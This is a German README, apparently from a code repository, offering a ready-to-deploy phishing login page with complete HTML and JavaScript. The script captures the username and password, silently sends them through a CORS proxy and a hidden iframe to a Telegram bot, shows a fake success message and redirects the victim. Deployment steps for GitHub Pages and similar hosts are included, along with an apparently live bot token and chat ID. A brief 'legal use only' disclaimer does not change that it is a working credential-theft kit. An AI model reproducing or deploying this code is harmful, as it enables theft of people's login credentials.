# Phishing Login Page (Deutsch)

Eine einfache, aber effektive Phishing-Anmeldeseite auf Deutsch mit modernem blauem Design.  
Nach dem Absenden der Daten werden Benutzername und Passwort **stillschweigend an deinen Telegram-Bot** gesendet und der Nutzer wird automatisch weitergeleitet.

Perfekt für Tests oder Demonstrationszwecke (nutze es nur legal und ethisch!).

## Vorschau

![Vorschau der Login-Seite](preview.png)
*(Füge hier einen Screenshot deiner Seite als `preview.png` ins Repo hinzu, damit es schöner aussieht)*

## Funktionen

- Schönes responsives Design (blau/lila Gradient)
- Deutsche Sprache
- Daten werden per Telegram Bot empfangen
- Nach Login: Erfolgsmeldung + automatische Weiterleitung
- Kein Backend nötig – läuft komplett auf statischem Hosting (GitHub Pages, Vercel, Netlify, etc.)

## Setup-Anleitung

1. **Ersetze die Platzhalter im Code:**
   - `botToken` → Dein Telegram Bot Token
   - `chatId` → Deine Chat-ID
   - `redirectUrl` → Die URL, wohin nach dem Login weitergeleitet werden soll (z. B. Google, YouTube, eine fake Dashboard-Seite)

2. **Lade die `index.html` hoch** (der Code aus deinem Repo).

3. **Deploye den Site:**
   - GitHub Pages: Gehe zu Settings → Pages → Branch: main → Save
   - Oder Vercel/Netlify/Cloudflare Pages (einfach Repo verbinden)

4. Fertig! Teile den Link – bei jedem Login bekommst du eine Nachricht in Telegram.

## Wichtige Sicherheitshinweise

- Der Bot-Token ist im Code sichtbar → Jeder mit Zugriff auf den Quellcode kann dir spammen.
- Für echte Sicherheit: Später auf einen eigenen Proxy (z. B. Vercel Serverless Function) umstellen.
- Nutze das nur in legalen/umgänglichen Szenarien (z. B. Penetration Testing mit Erlaubnis).

## Code (index.html)

```html
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anmeldung</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
            width: 320px;
            text-align: center;
            color: #333;
        }
        h2 {
            margin: 0 0 30px 0;
            color: #667eea;
            font-size: 28px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 8px rgba(102, 126, 234, 0.3);
        }
        button {
            width: 100%;
            padding: 16px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        button:hover {
            background: #5a6fd8;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            font-size: 18px;
            min-height: 24px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Anmeldung</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Benutzername" required>
            <input type="password" id="password" placeholder="Passwort" required>
            <button type="submit">Einloggen</button>
        </form>

        <div id="status"></div>
        <div class="footer">Willkommen zurück!</div>
    </div>

    <!-- Скрытый iframe для отправки -->
    <iframe name="hiddenIframe" style="display:none;"></iframe>

    <script>
        const botToken = "8408447077:AAFtGEn83fMMy66MnIdveRPW5kQ5ZQukU04";
        const chatId = "5684291694";
        const proxyUrl = "https://corsproxy.io/?";

        // СЮДА ВСТАВЬ ССЫЛКУ, НА КОТОРУЮ ПЕРЕНАПРАВЛЯТЬ ПОСЛЕ ЛОГИНА
        const redirectUrl = "https://www.google.com";  // ← Замени на свой URL!
        // Примеры:
        // "success.html" — если у тебя есть файл success.html на Neocities
        // "https://youtube.com" 
        // "https://deine-seite.neocities.org/dashboard"

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();

            const rawUsername = document.getElementById("username").value;
            const rawPassword = document.getElementById("password").value;

            const text = encodeURIComponent(`🔔 Neuer Login-Versuch!\n\n👤 Benutzername: ${rawUsername}\n🔑 Passwort: ${rawPassword}`);

            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=HTML`;

            const fullUrl = proxyUrl + encodeURIComponent(apiUrl);

            // Отправка данных в Telegram
            const iframe = document.createElement('iframe');
            iframe.src = fullUrl;
            iframe.style.display = "none";
            document.body.appendChild(iframe);
            setTimeout(() => document.body.removeChild(iframe), 1000);

            // Показываем успех
            document.getElementById("status").innerHTML = "Erfolgreich angemeldet! Weiterleitung... 🔄";
            document.getElementById("status").style.color = "#28a745";

            // Очистка полей
            document.getElementById("username").value = "";
            document.getElementById("password").value = "";

            // Перенаправление через 2 секунды
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 2000);
        });
    </script>
</body>
</html>
